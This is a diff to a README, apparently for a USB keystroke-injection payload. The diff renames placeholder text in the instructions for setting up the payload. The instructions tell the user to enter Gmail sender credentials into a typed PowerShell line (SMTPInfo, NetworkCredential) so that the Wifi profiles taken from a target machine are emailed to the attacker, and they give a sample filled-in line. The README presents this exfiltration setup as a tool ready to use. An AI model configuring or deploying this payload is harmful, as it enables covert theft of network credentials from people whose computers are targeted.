@@ -11,11 +11,11 @@ You must Edit the script to include a sender Gamils account creds as well as a r
 You will need to edit the feilds for Senders and recievers email creditals.
 For Senders Email go to line 101 or find this line 
 
-<i><b> Keyboard.print("$SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('CHANGE_THIS_GMAIL_ADDRESS@gmail.com', 'CHANGE_THIS_TO_EMAIL_PASSWORD')");</b></i> 
+<i><b> Keyboard.print("$SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('CHANGE_THIS_GMAIL_ADDRESS@gmail.com', 'CHANGE_THIS_TO_GMAIL_PASSWORD')");</b></i> 
 
 Here you will need to change the text that says <b><i>CHANGE_THIS_GMAIL_ADDRESS@gmail.com</i></b> to the gmail address the Wifi Profile is to be sent from.
 
-Then Change the text that says <i><b>CHANGE_THIS_TO_EMAIL_PASSWORD</b></i> to the corresponding password of the email address from above.
+Then Change the text that says <i><b>CHANGE_THIS_TO_GMAIL_PASSWORD</b></i> to the corresponding password of the email address from above.
 
 IE: <i><b>Keyboard.print("$SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('johndoe.techjuvi@gmail.com', 'Password1234')")</b></i>
 
